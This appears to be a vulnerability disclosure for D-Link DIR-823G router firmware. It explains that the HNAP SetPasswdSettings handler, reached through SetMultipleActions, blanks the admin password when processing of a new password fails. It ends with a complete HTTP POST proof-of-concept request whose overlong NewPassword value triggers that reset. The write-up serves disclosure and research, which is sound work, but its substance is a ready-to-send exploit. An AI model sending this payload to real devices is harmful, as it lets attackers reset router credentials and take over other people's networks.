# DIR823G_V1.0.2B05_20181207.bin Reset password vulnerability

## Overview

- Manufacturer's address：http://www.dlink.com.cn/
- Firmware download address ： http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DIR-823G

## Affected version

Below is the latest firmware

![](img/1.png#center)

## Vulnerability details

SetMultipleActions handler function will traverse the function list, and then query whether there is a matching function in the incoming data. When SetPasswdSettings exists, the SetPasswdSettings handler will be executed.

![](img/2.jpg#center)

SetPasswdSettings handler function 35 lines of code try to process the incoming password, if the processing fails, execute 53 lines of code to set the password to empty.

![](img/3.jpg#center)


## Vulnerability verify

![](img/4.gif#center)


## POC

```
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://purenetworks.com/HNAP1/SetMultipleActions"
HNAP_AUTH: 8D2D80BB8F1D63D9FF6E08DE6B821073 1675516820
X-Requested-With: XMLHttpRequest
Content-Length: 550
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/SNTP.html
Cookie: uid=GcfQ7q3TwY; PrivateKey=455D512F7EA7AA45CC1B4CBB4562DE49; timeout=106

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetMultipleActions xmlns="http://purenetworks.com/HNAP1/"><SetPasswdSettings xmlns="http://purenetworks.com/HNAP1/"><NewPassword>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</NewPassword></SetPasswdSettings></SetMultipleActions></soap:Body></soap:Envelope>
```
